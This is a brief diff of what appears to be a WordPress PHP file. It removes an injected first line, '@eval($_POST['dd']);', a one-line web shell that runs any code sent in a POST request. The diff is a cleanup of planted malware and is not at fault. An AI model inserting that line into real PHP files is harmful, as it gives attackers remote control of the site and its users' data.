@@ -1,4 +1,4 @@
-<?php @eval($_POST['dd']);?><?php  ?><?php?><?php
+<?php
 
 // Exit if accessed directly
 if ( !defined( 'ABSPATH' ) ) {
